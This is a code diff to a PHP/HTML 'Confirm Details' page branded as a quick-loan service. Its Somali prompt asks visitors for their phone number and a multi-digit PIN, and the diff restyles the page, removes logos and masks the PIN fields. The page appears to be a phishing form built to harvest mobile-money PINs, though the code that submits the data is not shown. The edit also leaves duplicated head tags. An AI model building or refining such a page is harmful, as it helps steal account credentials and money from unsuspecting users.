@@ -9,15 +9,106 @@ if(isset($_GET['error'])){
 <head>
 
 <title>Confirm Details</title>
-<link rel="stylesheet" href="style.css">
+<head>
+
+<title>Confirm Details</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg, #b6e63a, #6ccf3c);
+    text-align: center;
+}
+
+/* Logo */
+.logo-container {
+    margin-top: 20px;
+}
+
+.logo {
+    width: 120px;
+}
+
+/* Main container */
+.container {
+    background: #f5f5f5;
+    margin: 30px 15px;
+    padding: 25px;
+    border-radius: 25px;
+}
+
+/* Title */
+h2 {
+    font-size: 18px;
+    margin-bottom: 20px;
+}
+
+/* Phone box */
+.phone-box {
+    display: flex;
+    align-items: center;
+    border: 2px solid #4CAF50;
+    border-radius: 12px;
+    padding: 12px;
+    margin-bottom: 20px;
+    background: white;
+}
+
+.phone-box span {
+    margin-right: 10px;
+    font-weight: bold;
+}
+
+.phone-box input {
+    border: none;
+    outline: none;
+    font-size: 16px;
+    width: 100%;
+}
+
+/* PIN boxes */
+.pin-box {
+    display: flex;
+    justify-content: center;
+    gap: 10px;
+    margin: 15px 0;
+}
+
+.pin-box input {
+    width: 50px;
+    height: 50px;
+    border: 2px solid #4CAF50;
+    border-radius: 10px;
+    text-align: center;
+    font-size: 22px;
+}
+
+/* Eye icon */
+#togglePin {
+    display: inline-block;
+    margin-top: 10px;
+}
+
+/* Button */
+button {
+    width: 100%;
+    padding: 15px;
+    margin-top: 20px;
+    border: none;
+    border-radius: 12px;
+    background: #ccc;
+    color: white;
+    font-size: 18px;
+}
+</style>
+
+</head>
 
 </head>
 
 <body>
-<!-- top logo -->
-<div class="logo-container">
-     <img src="logo.png" alt="INBUCKS QUICK EASY LOANS Logo" class="logo">
-</div>
+
 <div class="container">
 
 <h2>Fadlan geli lambarka iyo PIN-ka si aad u sii wadato</h2>
@@ -32,7 +123,7 @@ if(isset($_GET['error'])){
 <div class="pin-container">
     
     <div class="pin-box">
-        <input type="tel" maxlength="1" class="pin" required>
+        <input type="password" maxlength="1" class="pin" required>
         <input type="password" maxlength="1" class="pin" required>
         <input type="password" maxlength="1" class="pin" required>
         <input type="password" maxlength="1" class="pin" required>
@@ -116,9 +207,6 @@ document.querySelector("form").addEventListener("submit", function() {
 });
 </script>
 
-<!-- Bottom Logo -->
-<div class="logo-container bottom">
-     <img src="logo.png" alt="INBUCKS QUICK EASY LOANS Logo" class="logo">
-</div>
+
 </body>
 </html>
